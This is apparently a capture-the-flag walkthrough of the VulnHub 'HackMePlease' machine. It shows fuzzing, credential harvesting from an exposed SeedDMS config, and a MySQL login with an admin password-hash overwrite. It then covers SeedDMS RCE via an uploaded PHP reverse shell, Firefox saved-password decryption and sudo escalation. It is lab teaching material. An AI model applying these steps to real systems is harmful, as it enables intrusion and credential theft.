# Recon
## TCP/80 - HTTP
### FFUF
```
┌──(root💀kali)-[~/vulnHub/HackMePlease]
└─# ffuf -u  http://192.168.110.7/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.sql' -fc 403

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.110.7/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
 :: Extensions       : .html .txt .php .sql 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response status: 403
________________________________________________

                        [Status: 200, Size: 23744, Words: 11302, Lines: 427]
css                     [Status: 301, Size: 312, Words: 20, Lines: 10]
fonts                   [Status: 301, Size: 314, Words: 20, Lines: 10]
img                     [Status: 301, Size: 312, Words: 20, Lines: 10]
index.html              [Status: 200, Size: 23744, Words: 11302, Lines: 427]
index.html              [Status: 200, Size: 23744, Words: 11302, Lines: 427]
js                      [Status: 301, Size: 311, Words: 20, Lines: 10]
:: Progress: [23075/23075] :: Job [1/1] :: 302 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
- No interesting directories enumerated

## TCP/33060 - SOCKS5
```
┌──(root💀kali)-[~/vulnHub/HackMePlease]
└─# nmap -p 33060 $ip --script socks-auth-info -sV -sC -A -v
PORT      STATE SERVICE VERSION
33060/tcp open  mysqlx?
| fingerprint-strings: 
|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
|     Invalid message"
|     HY000
|   LDAPBindReq: 
|     *Parse error unserializing protobuf message"
|     HY000
|   oracle-tns: 
|     Invalid message-frame."
|_    HY000
```
- `mysqlx?`


# Initial Foothold
## TCP/80 - HTTP - SeedDMS Misconfiguration 
1. Proceed to `http://192.168.110.7`
	![](images/Pasted%20image%2020220201004026.png)
2. Proceed to `Contact`
	![](images/Pasted%20image%2020220201004132.png)
	- Tried to do SQLi, failed
3. Take a look at the files being used for this webserver
	![](images/Pasted%20image%2020220201004342.png)
	- `Inspect Element -> Sources` 
1. Proceed to `js/main.js`, found hidden text
	![](images/Pasted%20image%2020220201004524.png)
	- `/seeddms51x/seeddms-5.1.22/`
5. Proceed to `/seeddms51x/seeddms-5.1.22/`
	![](images/Pasted%20image%2020220201012256.png)
	- Tried SQLi Auth Bypass, failed
	- Tried Default Creds, admin:admin, failed
6. [Download](https://sourceforge.net/projects/seeddms/files/seeddms-5.1.22/seeddms-quickstart-5.1.22.tar.gz/download) `seeddms-5.1.22` to analyze the directory structure
7. Directory Structure of `seeddms-5.1.22`
	```
	┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit]
	└─# tree -d seeddms51x/ -L 1
	seeddms51x/
	├── conf
	├── data
	├── pear
	├── seeddms -> seeddms-5.1.22
	├── seeddms-5.1.22
	└── www
	6 directories
	```
	- `seeddms51x`,
		-  matches our URL
	- `conf` 
		-  usually contains sensitive/configuration information
8. View `conf`directory
	```
	┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit]
	└─# tree -a seeddms51x/conf/ 
	seeddms51x/conf/
	├── .htaccess
	├── settings.xml
	├── settings.xml.template
	└── stopwords.txt
	```
	![](images/Pasted%20image%2020220201014045.png)
	- If we are able to view `settings.xml`, we are able to obtain SQL/SMTP credentials
9. Proceed to `http://192.168.110.7/seeddms51x/conf/settings.xml`
	![](images/Pasted%20image%2020220201014551.png)
	- seeddms:seeddms
	
## TCP/3306 - mysql
1. Access SQL w/ seeddms:seeddms
	```
	┌──(root💀kali)-[~/vulnHub/HackMePlease]
	└─# mysql -h $ip -u seeddms -p
	Enter password: seeddms
	Welcome to the MariaDB monitor.  Commands end with ; or \g.
	Your MySQL connection id is 2015
	Server version: 8.0.25-0ubuntu0.20.04.1 (Ubuntu)

	Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

	Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

	MySQL [(none)]> show databases;
	+--------------------+
	| Database           |
	+--------------------+
	| information_schema |
	| mysql              |
	| performance_schema |
	| seeddms            |
	| sys                |
	+--------------------+
	5 rows in set (0.160 sec)

	MySQL [(none)]> use seeddms;

	MySQL [seeddms]> show tables;
	+------------------------------+
	| Tables_in_seeddms            |
	+------------------------------+
	| tblACLs                      |
	| tblAttributeDefinitions      |
	| tblCategory                  |
	| tblDocumentApproveLog        |
	| ...						   |
	| tblUsers					   |
	| tblWorkflows                 |
	| users                        |
	+------------------------------+
	43 rows in set (0.002 sec)

	MySQL [seeddms]> show columns from users;
	+---------------------+--------------+------+-----+---------+----------------+
	| Field               | Type         | Null | Key | Default | Extra          |
	+---------------------+--------------+------+-----+---------+----------------+
	| Employee_id         | int          | NO   | PRI | NULL    | auto_increment |
	| Employee_first_name | varchar(500) | NO   |     | NULL    |                |
	| Employee_last_name  | varchar(500) | NO   |     | NULL    |                |
	| Employee_passwd     | varchar(500) | YES  |     | NULL    |                |
	+---------------------+--------------+------+-----+---------+----------------+
	4 rows in set (0.002 sec)


	MySQL [seeddms]> SELECT * FROM users;
	+-------------+---------------------+--------------------+-----------------+
	| Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
	+-------------+---------------------+--------------------+-----------------+
	|           1 | saket               | saurav             | Saket@#$1337    |
	+-------------+---------------------+--------------------+-----------------+
	1 row in set (0.001 sec)
	```
	- Tried to login w/ 
		- saket:`Saket@#$1337`
		- 1:`Saket@#$1337`
		- saurav:`Saket@#$1337`
	- This is not the table that stores login credentials
2. View `tblUsers;`
	```
	MySQL [seeddms]> show columns from tblUsers;
	+---------------+--------------+------+-----+---------+----------------+
	| Field         | Type         | Null | Key | Default | Extra          |
	+---------------+--------------+------+-----+---------+----------------+
	| id            | int          | NO   | PRI | NULL    | auto_increment |
	| login         | varchar(50)  | YES  | UNI | NULL    |                |
	| pwd           | varchar(50)  | YES  |     | NULL    |                |
	| fullName      | varchar(100) | YES  |     | NULL    |                |
	| email         | varchar(70)  | YES  |     | NULL    |                |
	| language      | varchar(32)  | NO   |     | NULL    |                |
	| theme         | varchar(32)  | NO   |     | NULL    |                |
	| comment       | text         | NO   |     | NULL    |                |
	| role          | smallint     | NO   |     | 0       |                |
	| hidden        | smallint     | NO   |     | 0       |                |
	| pwdExpiration | datetime     | YES  |     | NULL    |                |
	| loginfailures | tinyint      | NO   |     | 0       |                |
	| disabled      | smallint     | NO   |     | 0       |                |
	| quota         | bigint       | YES  |     | NULL    |                |
	| homefolder    | int          | YES  | MUL | NULL    |                |
	+---------------+--------------+------+-----+---------+----------------+
	15 rows in set (0.003 sec)

	MySQL [seeddms]> SELECT id,pwd,fullName, email FROM tblUsers;
	+----+----------------------------------+---------------+--------------------+
	| id | pwd                              | fullName      | email              |
	+----+----------------------------------+---------------+--------------------+
	|  1 | 5f4dcc3b5aa765d61d8327deb882cf99 | Administrator | address@server.com |
	|  2 | NULL                             | Guest User    | NULL               |
	+----+----------------------------------+---------------+--------------------+
	2 rows in set (0.001 sec)

	MySQL [seeddms]> UPDATE tblUsers
		-> SET pwd = '5f4dcc3b5aa765d61d8327deb882cf99'
		-> WHERE ID = 1;
	Query OK, 1 row affected (0.072 sec)
	Rows matched: 1  Changed: 1  Warnings: 0
	```
3. Login w/ admin:password
	![](images/Pasted%20image%2020220201021053.png)

## Back to TCP/80 - HTTP - SeedDMS RCE
1. Search exploits for `seeddms-5.1.22`

	| Exploit Title                                                   | Path                  |
	| --------------------------------------------------------------- | --------------------- |
	| Seeddms 5.1.10 - Remote Command Execution (RCE) (Authenticated) | php/webapps/50062.py  |
	| SeedDMS versions < 5.1.11 - Remote Command Execution            | php/webapps/47022.txt |

2. Tried `php/webapps/50062.py`, did not work
3. View `php/webapps/47022.txt`
	![](images/Pasted%20image%2020220201023437.png)
4. Exploit
	1. Add a document
		![](images/Pasted%20image%2020220201023802.png)
		- Take note of 
			- Document ID: 6
			- Version: 1
	2. Execute reverse shell
		- Proceed to `seeddms51x/data/1048576/6/1.php`
	3. Obtain www-data shell
		![](images/Pasted%20image%2020220201024310.png)

## Alternate Way - Log File
1. Fuzz directory for log files
	```
		┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit/seeddms]
	└─# ffuf -u http://192.168.110.7/seeddms51x/seeddms-5.1.22/FUZZ -w /usr/share/wordlists/dirb/common.txt -e '.html,.txt,.php,.log.bak,.log,.bak'
			/'___\  /'___\           /'___\       
		   /\ \__/ /\ \__/  __  __  /\ \__/       
		   \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
			\ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
			 \ \_\   \ \_\  \ \____/  \ \_\       
			  \/_/    \/_/   \/___/    \/_/       

		   v1.3.1 Kali Exclusive <3
	________________________________________________

	 :: Method           : GET
	 :: URL              : http://192.168.110.7/seeddms51x/seeddms-5.1.22/FUZZ
	 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt
	 :: Extensions       : .html .txt .php .log.bak .log .bak 
	 :: Follow redirects : false
	 :: Calibration      : false
	 :: Timeout          : 10
	 :: Threads          : 40
	 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
	________________________________________________
	access.log.bak          [Status: 200, Size: 81876, Words: 5393, Lines: 341]
	controllers             [Status: 301, Size: 346, Words: 20, Lines: 10]
	doc                     [Status: 301, Size: 338, Words: 20, Lines: 10]
	inc                     [Status: 301, Size: 338, Words: 20, Lines: 10]
	index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
	index.php               [Status: 302, Size: 0, Words: 1, Lines: 1]
	install                 [Status: 301, Size: 342, Words: 20, Lines: 10]
	languages               [Status: 301, Size: 344, Words: 20, Lines: 10]
	op                      [Status: 301, Size: 337, Words: 20, Lines: 10]
	out                     [Status: 301, Size: 338, Words: 20, Lines: 10]
	styles                  [Status: 301, Size: 341, Words: 20, Lines: 10]
	utils                   [Status: 301, Size: 340, Words: 20, Lines: 10]
	views                   [Status: 301, Size: 340, Words: 20, Lines: 10]
	webdav                  [Status: 301, Size: 341, Words: 20, Lines: 10]
	:: Progress: [32305/32305] :: Job [1/1] :: 4856 req/sec :: Duration: [0:00:05] :: Errors: 0 
	```
	- `access.log.bak`
2. Download & Obtain password
	```
	┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit/seeddms]
	└─# wget http://192.168.110.7/seeddms51x/seeddms-5.1.22/access.log.bak -q
	
	┌──(root💀kali)-[~/vulnHub/HackMePlease/192.168.110.7/exploit/seeddms]
	└─# cat access.log.bak | grep password
	127.0.0.1 - - [03/Jul/2021:00:01:12 -0700] "GET /seeddms51x/seeddms-5.1.22/out/backdoor.php?user=admin&password='HacK@#$L33T$%!@' HTTP/1.1" 401 4252 "/seeddms51x/seeddms-5.1.22/out/backdoor.php?user=admin&password=HacK@#$L33T$%!@" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0"
	```
	- admin:`HacK@#$L33T$%!@`
3. Login w/ admin:`HacK@#$L33T$%!@`
4. Upload Reverse shell

# Privilege Escalation
## Saket - Via Creds Found
1. Earlier, we obtained Saket's credentials
2. Switch to saket w/ saket:`Saket@#$1337`
	![](images/Pasted%20image%2020220201024743.png)
## Root - Via Sudo
1. After browsing through saket's home directory, there are firefox files
2. Obtain firefox files to extract password from it
	```
	saket@ubuntu:~$ find $(pwd)find $(pwd) 2>/dev/null | grep "key\|cookies\|logins\|cert"
	/home/saket/.gnupg/private-keys-v1.d
	/home/saket/.local/share/keyrings
	/home/saket/.local/share/keyrings/user.keystore
	/home/saket/.local/share/keyrings/login.keyring
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/key4.db
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/cookies.sqlite
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/logins.json
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/cert9.db
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/logins-backup.json
	/home/saket/.mozilla/firefox/jokfpwvh.default-release/cookies.sqlite-wal
	```
	- `key4.db`
	- `cookies.sqlite`
	- `logins.json`
	- `cert9.db`
3. Transfer to kali
4. Decrypt it
	```
	┌──(root💀kali)-[~/tools/firefox_decrypt]
	└─# python3 firefox_decrypt.py ~/vulnHub/HackMePlease/192.168.110.7/loot/firefox/
	2022-02-01 02:54:02,743 - WARNING - profile.ini not found in /root/vulnHub/HackMePlease/192.168.110.7/loot/firefox/
	2022-02-01 02:54:02,743 - WARNING - Continuing and assuming '/root/vulnHub/HackMePlease/192.168.110.7/loot/firefox/' is a profile location

	Website:   http://127.0.0.1
	Username: 'seeddms'
	Password: 'seedms'
	```
	- seeddms:seedms
5. Tried to switch to root w/ seeddms:seedms, failed
6. Check for sudo access
	```
	saket@ubuntu:~/.mozilla/firefox/jokfpwvh.default-release$ sudo -l
	[sudo] password for saket: 
	Matching Defaults entries for saket on ubuntu:
		env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

	User saket may run the following commands on ubuntu:
		(ALL : ALL) ALL
	saket@ubuntu:~/.mozilla/firefox/jokfpwvh.default-release$ sudo su
	```
7. Obtain root
	![](images/Pasted%20image%2020220201040217.png)



---
Tags: #tcp/80-http/rce #tcp/80-http/web-app-cms-exploit #linux-priv-esc/sudo/misconfig 

---